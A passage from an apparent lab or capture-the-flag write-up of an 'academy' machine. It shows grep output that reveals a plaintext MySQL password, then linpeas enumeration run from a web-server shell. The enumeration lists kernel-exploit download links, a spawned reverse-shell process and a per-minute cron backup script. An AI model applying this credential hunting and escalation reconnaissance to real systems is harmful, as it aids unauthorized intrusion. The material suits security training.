class="line">/usr/share/phpmyadmin/config.sample.inc.php:<span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;AllowNoPassword&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">/usr/share/phpmyadmin/libraries/config.default.php:<span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;AllowNoPassword&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">/usr/share/phpmyadmin/libraries/config.default.php:<span class="variable">$cfg</span>[<span class="string">&#x27;ShowChgPassword&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">**/var/www/html/academy/admin/includes/config.php:<span class="variable">$mysql_password</span> = <span class="string">&quot;My_V3ryS3cur3_P4ss&quot;</span>;</span><br><span class="line">/var/www/html/academy/includes/config.php:<span class="variable">$mysql_password</span> = <span class="string">&quot;My_V3ryS3cur3_P4ss&quot;</span>;**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><p>完整輸出</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./linpeas.sh</span><br><span class="line"></span><br><span class="line">                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄</span><br><span class="line">             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄</span><br><span class="line">         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄</span><br><span class="line">         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄</span><br><span class="line">         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ </span><br><span class="line">         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄</span><br><span class="line">         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄</span><br><span class="line">         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄</span><br><span class="line">         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄</span><br><span class="line">         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄</span><br><span class="line">         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ </span><br><span class="line">          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ </span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄</span><br><span class="line">          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀</span><br><span class="line">               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀</span><br><span class="line">                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀</span><br><span class="line"></span><br><span class="line">    /---------------------------------------------------------------------------------\</span><br><span class="line">    |                             Do you like PEASS?                                  |                                       </span><br><span class="line">    |---------------------------------------------------------------------------------|                                       </span><br><span class="line">    |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                       </span><br><span class="line">    |         Follow on Twitter         :     @hacktricks_live                        |                                       </span><br><span class="line">    |         Respect on HTB            :     SirBroccoli                             |                                       </span><br><span class="line">    |---------------------------------------------------------------------------------|                                       </span><br><span class="line">    |                                 Thank you!                                      |                                       </span><br><span class="line">    \---------------------------------------------------------------------------------/                                       </span><br><span class="line">          linpeas-ng by carlospolop                                                                                           </span><br><span class="line">                                                                                                                              </span><br><span class="line">ADVISORY: This script should be used <span class="keyword">for</span> authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner<span class="string">&#x27;s permission.                                                                                                </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist</span></span><br><span class="line"><span class="string"> LEGEND:                                                                                                                      </span></span><br><span class="line"><span class="string">  RED/YELLOW: 95% a PE vector</span></span><br><span class="line"><span class="string">  RED: You should take a look to it</span></span><br><span class="line"><span class="string">  LightCyan: Users with console</span></span><br><span class="line"><span class="string">  Blue: Users without console &amp; mounted devs</span></span><br><span class="line"><span class="string">  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) </span></span><br><span class="line"><span class="string">  LightMagenta: Your username</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> Starting linpeas. Caching Writable Folders...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                               ╔═══════════════════╗</span></span><br><span class="line"><span class="string">═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                           </span></span><br><span class="line"><span class="string">                               ╚═══════════════════╝                                                                          </span></span><br><span class="line"><span class="string">OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)</span></span><br><span class="line"><span class="string">User &amp; Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">Hostname: academy</span></span><br><span class="line"><span class="string">Writable folder: /dev/shm</span></span><br><span class="line"><span class="string">[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)</span></span><br><span class="line"><span class="string">[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                     </span></span><br><span class="line"><span class="string">[+] /usr/bin/nc is available for network discovery &amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                                          </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe</span></span><br><span class="line"><span class="string">DONE</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">                              ╔════════════════════╗</span></span><br><span class="line"><span class="string">══════════════════════════════╣ System Information ╠══════════════════════════════                                            </span></span><br><span class="line"><span class="string">                              ╚════════════════════╝                                                                          </span></span><br><span class="line"><span class="string">╔══════════╣ Operative system</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                            </span></span><br><span class="line"><span class="string">Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)</span></span><br><span class="line"><span class="string">Distributor ID: Debian</span></span><br><span class="line"><span class="string">Description:    Debian GNU/Linux 10 (buster)</span></span><br><span class="line"><span class="string">Release:        10</span></span><br><span class="line"><span class="string">Codename:       buster</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Sudo version</span></span><br><span class="line"><span class="string">sudo Not Found                                                                                                                </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ PATH</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                       </span></span><br><span class="line"><span class="string">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Date &amp; uptime</span></span><br><span class="line"><span class="string">Thu Feb 15 14:16:19 EST 2024                                                                                                  </span></span><br><span class="line"><span class="string"> 14:16:19 up  3:01,  1 user,  load average: 0.08, 0.02, 0.01</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)</span></span><br><span class="line"><span class="string">disk                                                                                                                          </span></span><br><span class="line"><span class="string">sda</span></span><br><span class="line"><span class="string">sda1</span></span><br><span class="line"><span class="string">sda2</span></span><br><span class="line"><span class="string">sda5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Unmounted file-system?</span></span><br><span class="line"><span class="string">╚ Check if you can mount umounted devices                                                                                     </span></span><br><span class="line"><span class="string">UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                 </span></span><br><span class="line"><span class="string">UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0</span></span><br><span class="line"><span class="string">/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Environment</span></span><br><span class="line"><span class="string">╚ Any private information inside environment variables?                                                                       </span></span><br><span class="line"><span class="string">HISTFILESIZE=0                                                                                                                </span></span><br><span class="line"><span class="string">OLDPWD=/</span></span><br><span class="line"><span class="string">APACHE_RUN_DIR=/var/run/apache2</span></span><br><span class="line"><span class="string">APACHE_PID_FILE=/var/run/apache2/apache2.pid</span></span><br><span class="line"><span class="string">JOURNAL_STREAM=9:13249</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></span><br><span class="line"><span class="string">INVOCATION_ID=e90a63eda0df49cf8bebcb515095709a</span></span><br><span class="line"><span class="string">APACHE_LOCK_DIR=/var/lock/apache2</span></span><br><span class="line"><span class="string">LANG=C</span></span><br><span class="line"><span class="string">HISTSIZE=0</span></span><br><span class="line"><span class="string">APACHE_RUN_USER=www-data</span></span><br><span class="line"><span class="string">APACHE_RUN_GROUP=www-data</span></span><br><span class="line"><span class="string">APACHE_LOG_DIR=/var/log/apache2</span></span><br><span class="line"><span class="string">PWD=/tmp</span></span><br><span class="line"><span class="string">HISTFILE=/dev/null</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching Signature verification failed in dmesg</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                        </span></span><br><span class="line"><span class="string">dmesg Not Found                                                                                                               </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Executing Linux Exploit Suggester</span></span><br><span class="line"><span class="string">╚ https://github.com/mzet-/linux-exploit-suggester                                                                            </span></span><br><span class="line"><span class="string">cat: write error: Broken pipe                                                                                                 </span></span><br><span class="line"><span class="string">cat: write error: Broken pipe</span></span><br><span class="line"><span class="string">cat: write error: Broken pipe</span></span><br><span class="line"><span class="string">cat: write error: Broken pipe</span></span><br><span class="line"><span class="string">[+] [CVE-2019-13272] PTRACE_TRACEME</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</span></span><br><span class="line"><span class="string">   Exposure: highly probable</span></span><br><span class="line"><span class="string">   Tags: ubuntu=16.04&#123;kernel:4.15.0-*&#125;,ubuntu=18.04&#123;kernel:4.15.0-*&#125;,debian=9&#123;kernel:4.9.0-*&#125;,[ debian=10&#123;kernel:4.19.0-*&#125; ],fedora=30&#123;kernel:5.0.9-*&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip</span></span><br><span class="line"><span class="string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c</span></span><br><span class="line"><span class="string">   Comments: Requires an active PolKit agent.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] [CVE-2021-22555] Netfilter heap out-of-bounds write</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</span></span><br><span class="line"><span class="string">   Exposure: less probable</span></span><br><span class="line"><span class="string">   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;</span></span><br><span class="line"><span class="string">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c</span></span><br><span class="line"><span class="string">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c</span></span><br><span class="line"><span class="string">   Comments: ip_tables kernel module must be loaded</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Executing Linux Exploit Suggester 2</span></span><br><span class="line"><span class="string">╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                       </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Protections</span></span><br><span class="line"><span class="string">═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                 </span></span><br><span class="line"><span class="string">apparmor module is loaded.</span></span><br><span class="line"><span class="string">═╣ AppArmor profile? .............. unconfined</span></span><br><span class="line"><span class="string">═╣ is linuxONE? ................... s390x Not Found</span></span><br><span class="line"><span class="string">═╣ grsecurity present? ............ grsecurity Not Found                                                                      </span></span><br><span class="line"><span class="string">═╣ PaX bins present? .............. PaX Not Found                                                                             </span></span><br><span class="line"><span class="string">═╣ Execshield enabled? ............ Execshield Not Found                                                                      </span></span><br><span class="line"><span class="string">═╣ SELinux enabled? ............... sestatus Not Found                                                                        </span></span><br><span class="line"><span class="string">═╣ Seccomp enabled? ............... disabled                                                                                  </span></span><br><span class="line"><span class="string">═╣ User namespace? ................ enabled</span></span><br><span class="line"><span class="string">═╣ Cgroup2 enabled? ............... enabled</span></span><br><span class="line"><span class="string">═╣ Is ASLR enabled? ............... Yes</span></span><br><span class="line"><span class="string">═╣ Printer? ....................... No</span></span><br><span class="line"><span class="string">═╣ Is this a virtual machine? ..... Yes (vmware)                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                   ╔═══════════╗</span></span><br><span class="line"><span class="string">═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                           </span></span><br><span class="line"><span class="string">                                   ╚═══════════╝                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Container related tools present (if any):</span></span><br><span class="line"><span class="string">╔══════════╣ Am I Containered?                                                                                                </span></span><br><span class="line"><span class="string">╔══════════╣ Container details                                                                                                </span></span><br><span class="line"><span class="string">═╣ Is this a container? ........... No                                                                                        </span></span><br><span class="line"><span class="string">═╣ Any running containers? ........ No                                                                                        </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                     ╔═══════╗</span></span><br><span class="line"><span class="string">═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                           </span></span><br><span class="line"><span class="string">                                     ╚═══════╝                                                                                </span></span><br><span class="line"><span class="string">═╣ Google Cloud Platform? ............... No</span></span><br><span class="line"><span class="string">═╣ AWS ECS? ............................. No</span></span><br><span class="line"><span class="string">═╣ AWS EC2? ............................. No</span></span><br><span class="line"><span class="string">═╣ AWS EC2 Beanstalk? ................... No</span></span><br><span class="line"><span class="string">═╣ AWS Lambda? .......................... No</span></span><br><span class="line"><span class="string">═╣ AWS Codebuild? ....................... No</span></span><br><span class="line"><span class="string">═╣ DO Droplet? .......................... No</span></span><br><span class="line"><span class="string">═╣ Aliyun ECS? .......................... No</span></span><br><span class="line"><span class="string">═╣ IBM Cloud VM? ........................ No</span></span><br><span class="line"><span class="string">═╣ Azure VM? ............................ No</span></span><br><span class="line"><span class="string">═╣ Azure APP? ........................... No</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                ╔════════════════════════════════════════════════╗</span></span><br><span class="line"><span class="string">════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                            </span></span><br><span class="line"><span class="string">                ╚════════════════════════════════════════════════╝                                                            </span></span><br><span class="line"><span class="string">╔══════════╣ Cleaned processes</span></span><br><span class="line"><span class="string">╚ Check weird &amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes   </span></span><br><span class="line"><span class="string">root         1  0.0  0.9 103800 10036 ?        Ss   11:15   0:01 /sbin/init                                                   </span></span><br><span class="line"><span class="string">root       329  0.0  0.8  40368  8120 ?        Ss   11:15   0:00 /lib/systemd/systemd-journald</span></span><br><span class="line"><span class="string">root       349  0.0  0.5  22196  5152 ?        Ss   11:15   0:00 /lib/systemd/systemd-udevd</span></span><br><span class="line"><span class="string">systemd+   419  0.0  0.6  93084  6504 ?        Ssl  11:15   0:00 /lib/systemd/systemd-timesyncd</span></span><br><span class="line"><span class="string">  └─(Caps) 0x0000000002000000=cap_sys_time</span></span><br><span class="line"><span class="string">message+   421  0.0  0.4   8980  4380 ?        Ss   11:15   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only</span></span><br><span class="line"><span class="string">  └─(Caps) 0x0000000020000000=cap_audit_write</span></span><br><span class="line"><span class="string">root       428  0.0  0.6 225824  6108 ?        Ssl  11:15   0:00 /usr/sbin/rsyslogd -n -iNONE</span></span><br><span class="line"><span class="string">root       429  0.0  0.2   8504  2840 ?        Ss   11:15   0:00 /usr/sbin/cron -f</span></span><br><span class="line"><span class="string">root       430  0.0  0.7  19488  7292 ?        Ss   11:15   0:00 /lib/systemd/systemd-logind</span></span><br><span class="line"><span class="string">root       436  0.0  0.2   6620  2936 ?        Ss   11:15   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf</span></span><br><span class="line"><span class="string">root       443  0.0  0.3   7148  3612 tty1     Ss   11:15   0:00 /bin/login -p --</span></span><br><span class="line"><span class="string">root       644  0.0  0.4   7652  4504 tty1     S+   11:16   0:00  _ -bash</span></span><br><span class="line"><span class="string">root       453  0.0  0.6  15852  6912 ?        Ss   11:15   0:00 /usr/sbin/sshd -D</span></span><br><span class="line"><span class="string">root       521  0.0  2.2 214992 22840 ?        Ss   11:15   0:01 /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data   546  0.1  2.3 218796 23308 ?        S    11:15   0:15  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1615  0.0  1.9 215484 19468 ?        S    12:57   0:01  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  2138  0.0  0.0   2388   748 ?        S    13:44   0:00  |   _ sh -c uname -a; w; id; /bin/sh -i</span></span><br><span class="line"><span class="string">www-data  2142  0.0  0.0   2388   756 ?        S    13:44   0:00  |       _ /bin/sh -i</span></span><br><span class="line"><span class="string">www-data  2431  1.0  0.2   3404  2688 ?        S    14:16   0:00  |           _ /bin/sh ./linpeas.sh</span></span><br><span class="line"><span class="string">www-data  5153  0.0  0.1   3404  1224 ?        S    14:16   0:00  |               _ /bin/sh ./linpeas.sh</span></span><br><span class="line"><span class="string">www-data  5157  0.0  0.3   7960  3096 ?        R    14:16   0:00  |               |   _ ps fauxwww</span></span><br><span class="line"><span class="string">www-data  5156  0.0  0.1   3404  1224 ?        S    14:16   0:00  |               _ /bin/sh ./linpeas.sh</span></span><br><span class="line"><span class="string">www-data  1617  0.0  1.3 215516 13276 ?        S    12:57   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1632  0.0  1.3 215532 13296 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1650  0.0  1.2 215348 12696 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1655  0.0  1.8 215572 18844 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1657  0.0  1.9 215484 19540 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1663  0.0  1.9 215572 19468 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1665  0.0  1.8 215476 18788 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">www-data  1668  0.0  1.9 215576 19692 ?        S    12:58   0:00  _ /usr/sbin/apache2 -k start</span></span><br><span class="line"><span class="string">mysql      541  0.0  9.1 1254884 92120 ?       Ssl  11:15   0:08 /usr/sbin/mysqld</span></span><br><span class="line"><span class="string">root       639  0.0  0.8  21024  8436 ?        Ss   11:16   0:00 /lib/systemd/systemd --user</span></span><br><span class="line"><span class="string">root       640  0.0  0.2  22836  2188 ?        S    11:16   0:00  _ (sd-pam)</span></span><br><span class="line"><span class="string">root       674  0.0  0.5   9488  5596 ?        Ss   11:20   0:00 dhclient</span></span><br><span class="line"><span class="string">root       690  0.0  0.5   9488  5736 ?        Ss   11:20   0:00 dhclient</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Binary processes permissions (non &#x27;</span>root root<span class="string">&#x27; and not belonging to current user)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                  </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Processes whose PPID belongs to a different user (not root)</span></span><br><span class="line"><span class="string">╚ You will know if a user can somehow spawn processes as a different user                                                     </span></span><br><span class="line"><span class="string">Proc 419 with ppid 1 is run by user systemd-timesync but the ppid user is root                                                </span></span><br><span class="line"><span class="string">Proc 421 with ppid 1 is run by user messagebus but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 541 with ppid 1 is run by user mysql but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 546 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1615 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1617 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1632 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1650 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1655 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1657 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1663 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1665 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string">Proc 1668 with ppid 521 is run by user www-data but the ppid user is root</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Files opened by processes belonging to other users</span></span><br><span class="line"><span class="string">╚ This is usually empty because of the lack of privileges to read other user processes information                            </span></span><br><span class="line"><span class="string">COMMAND    PID TID TASKCMD               USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Processes with credentials in memory (root req)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                            </span></span><br><span class="line"><span class="string">gdm-password Not Found                                                                                                        </span></span><br><span class="line"><span class="string">gnome-keyring-daemon Not Found                                                                                                </span></span><br><span class="line"><span class="string">lightdm Not Found                                                                                                             </span></span><br><span class="line"><span class="string">vsftpd process found (dump creds from memory as root)                                                                         </span></span><br><span class="line"><span class="string">apache2 process found (dump creds from memory as root)</span></span><br><span class="line"><span class="string">sshd Not Found</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Cron jobs</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                        </span></span><br><span class="line"><span class="string">/usr/bin/crontab                                                                                                              </span></span><br><span class="line"><span class="string">incrontab Not Found</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root    1077 Jun 16  2021 /etc/crontab                                                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.d:</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  712 Dec 17  2018 php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.daily:</span></span><br><span class="line"><span class="string">total 40</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.hourly:</span></span><br><span class="line"><span class="string">total 12</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.monthly:</span></span><br><span class="line"><span class="string">total 12</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/cron.weekly:</span></span><br><span class="line"><span class="string">total 16</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span></span><br><span class="line"><span class="string">-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SHELL=/bin/sh</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span></span><br><span class="line"><span class="string">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span></span><br><span class="line"><span class="string">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span></span><br><span class="line"><span class="string">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">* * * * * /home/grimmie/backup.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Systemd PATH</span></span><br><span class="line"><span class="string">╚ 